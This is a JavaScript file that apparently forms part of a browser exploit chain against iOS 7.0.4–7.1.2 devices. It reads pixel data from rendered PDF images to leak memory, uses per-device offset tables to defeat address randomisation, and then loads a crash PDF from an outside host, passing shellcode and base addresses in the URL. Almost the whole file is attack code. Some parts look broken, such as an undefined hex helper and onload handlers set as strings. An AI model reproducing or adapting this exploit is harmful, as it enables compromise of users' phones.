/***
 *    ███████╗ ██╗              ███████╗ ██╗   ██████╗ 
 *    ╚════██║███║              ╚════██║███║   ╚════██╗
 *        ██╔╝╚██║    █████╗        ██╔╝╚██║    █████╔╝
 *       ██╔╝  ██║    ╚════╝       ██╔╝  ██║   ██╔═══╝ 
 *       ██║██╗██║                 ██║██╗██║██╗███████╗
 *       ╚═╝╚═╝╚═╝                 ╚═╝╚═╝╚═╝╚═╝╚══════╝
 *		ETA s0n                                           
 */

using('liblogging');

print = alert;

//initialization
var ctrladdr = 0;
var dyldsharedcachebase = 0;
var version = '';

//hex conversion
function dectohex(d, padding) {
	var hex = Number(d).toString(16);
	padding = typeof (padding) === "undefined" || padding === null ? padding = 2 : padding;
    while (hex.length < padding) {
        hex = "0" + hex;
    }
    return hex;
}

function dectohex64(d) {
	var hex = d.toString(16)
    while (hex.length < 16) {
        hex = "0" + hex;
    }
    return "0x"+hex;
}

//Simple compression algo
function pack32(i){
    var low = (i & 0xffff);
    var high = ((i>>16) & 0xffff);
    return String.fromCharCode(low)+String.fromCharCode(high);
}

function unpack32At(s, pos){
    return  s.charCodeAt(pos) + (s.charCodeAt(pos+1)<<16);
}


function pack(i){
    var low = (i & 0xffff);
    var high = ((i >> 16) & 0xffff);
    return String.fromCharCode(low)+String.fromCharCode(high);
}

function packs(s){
    result = "";
    for (i=0; i<s.length; i+=2) {
        result += String.fromCharCode(s.charCodeAt(i) + (s.charCodeAt(i+1) << 8));
    }
    return result;
}

//Infoleak 1
function leakcode() {
	var img = document.getElementById('pdfleak_code');
	var canvas = document.createElement("canvas");
	var pixelData = null;
	var content = null;
	canvas.width = img.width;
	canvas.height = img.height;
	canvas.getContext('2d').drawImage(img, 0, 0, img.width, img.height);
	pixelData = canvas.getContext('2d').getImageData(0, 0, img.width, img.height).data;
	var leak = new Array();
	for(var i = 0; i < img.width * img.height * 4; i+=1) {
		if( (1+i) % 4 == 0) {
			continue;
		}
		leak[leak.length] = pixelData[i];
	}
	img.parentNode.removeChild(img);
	var sploit_offsets = [
		{ 
			"byte0": 0xd5, "byte1": 0x29, "byte2": 0x29, "agent": "7_0_4 ",
        	"version": "iPhone3,1-7.0.4",
            "dyld_shared_cache_offset":  0x15339d5 
        },
        {
        	"byte0": 0x41, "byte1": 0x95, "byte2": 0x95,  "agent": "7_1 ",
            "version": "iPhone4,1-7.1", 
            "dyld_shared_cache_offset": 0x2f738b41 - 0x2e17d000 
        },
        { 
        	"byte0": 0x8d, "byte1": 0xdd, "byte2": 0xdd, "agent": "7_1 ",
            "version": "iPhone5,1-7.1", 
            "dyld_shared_cache_offset": 0x2d6d8f8d - 0x2c116000
        },
        { 
        	"byte0": 0x8d, "byte1": 0xdd, "byte2": 0xdd, "agent": "7_1_1",
            "version": "iPhone5,1-7.1.1", 
            "dyld_shared_cache_offset": 0x015c2f8d
        },
        { 
        	"byte0": 0xa9, "byte1": 0xf9, "byte2": 0xf9, 
            "version": "iPhone5,1-7.1.2", 
            "dyld_shared_cache_offset": 0x015a9ca9 
        },
        { 
	    	"byte0": 0x71, "byte1": 0xc5, "byte2": 0xc5, 
	        "version": "iPhone4-7.1.2", 
	        "dyld_shared_cache_offset": 0x01598571 
        }
	];
	var l = '';
	var pos = -1;
	var offset = 0;
	for(var i = 0; i<leak.length; i++){
		l = l +'.' + decimalToHex(leak[i]);
        for(var j = 0; j< sploit_offsets.length; j++){
            var sploit_offset = sploit_offsets[j];
            if (
            	pos == -1  && 
            	i > 8 && 
            	leak[i-8] == sploit_offset["byte0"] &&
            	leak[i-4] == sploit_offset["byte1"] && 
            	leak[i] == sploit_offset["byte2"]
            ){
                if (sploit_offset.hasOwnProperty("agent") && navigator.userAgent.indexOf(sploit_offset["agent"]) == -1){
                    continue;
                }

                version = sploit_offset["version"];
                offset = sploit_offset["dyld_shared_cache_offset"];
                pos = i-8;
                break;
            }
        }
	}
	if(pos==-1) {
		alert("Debug info: "+l);
		throw new Error("Unsupported device. Missing offsets.");
	}
	dyldsharedcachebase = 0;
	for(var i = 3; i >= 0; i--) {
		dyldsharedcachebase = dyldsharedcachebase * 256 + leak[pos+i];
	}
	dyldsharedcachebase = dyldsharedcachebase - offset;
	print("dyldsharedcachebase is at: 0x"+dyldsharedcachebase.toString(16));
	document.getElementById('pdfleak_data').src='leakdata.pdf?'+Math.random();
}

//Infoleak 2
function leakdata() {
	var img = document.getElementById("pdfleak_data")
    var canvas = document.createElement('canvas');
    var pixelData;
    var content;
    canvas.width = img.width;
    canvas.height = img.height;

    canvas.getContext('2d').drawImage(img, 0, 0, img.width, img.height);
    pixelData = canvas.getContext('2d').getImageData(0, 0, img.width, img.height).data;

    var leak = new Array();
    for (var i=0; i<img.width*img.height*4; i+=1){
        if ( (1+i)%4 == 0 )
            continue;
        leak[leak.length] = pixelData[i];
    }
    img.parentNode.removeChild(img);
    var l = '';
    var pos = -1;
    for(var i = 0; i<leak.length; i++){
        l = l +'.' + decimalToHex(leak[i]);
        if ( pos == -1  && 
        	i > 4 && 
        	leak[i-4] == 0x64 && 
        	leak[i-3] == 0x64  &&
        	leak[i-2] == 0x64  &&
        	leak[i-1] == 0x00  && 
        	(leak[i+1] != 0x00 || leak[i+2] != 0x00)
        ){
            pos = i;
        }
    }
    if(pos==-1){
    	throw new Error('Failed to leak data.');
    }
    ctrladdr = 0;
    for(var i = 3; i >= 0; i--) {
    	ctrladdr = ctrladdr * 256 + leak[pos+i];
    }
    ctrladdr = ctrladdr + 32 + 8;
    print("Stage 1 complete. Launching stage 2...");
    document.getElementById('pdfcrash').src='http://www.binamuse.com/?shellcode=0x'
    									+ctrladdr.toString(16)+"&"
    									+"baseaddr=0x"+dyldsharedcachebase.toString(16)+"&"
    									+"version="+version+"&"+Math.random();
    for(var i = 0; i<10000;i++);

}

function pwn() {
	print("PWNED?");
}

var cg7go = function() {
	var pdfleak_code_el = document.createElement("img");// ("pdfleak_code");
	var pdfleak_data_el = document.createElement("img"); //("pdfleak_data");
	var pdfcrash_el = document.createElement("img"); //("pdfcrash");
	var main_el = document.createElement("div");

	main_el.id = "main";
	pdfleak_code_el.id = "pdfleak_code";
	pdfleak_code_el.src = "payloads/71_712/leakcode.pdf?"+Math.random();

	pdfleak_data_el.id = "payloads/71_712/pdfleak_data?"+Math.random();
	pdfcrash_el.id = "pdfcrash_el";

	pdfleak_code_el.onload = "leakcode()";
	pdfleak_data_el.onload = "leakdata()";
	pdfcrash_el.onload = "pwn()";

	document.body.appendChild(pdfleak_code_el);
	document.body.appendChild(pdfleak_data_el);
	document.body.appendChild(pdfcrash_el);
	document.body.appendChild(main_el);
};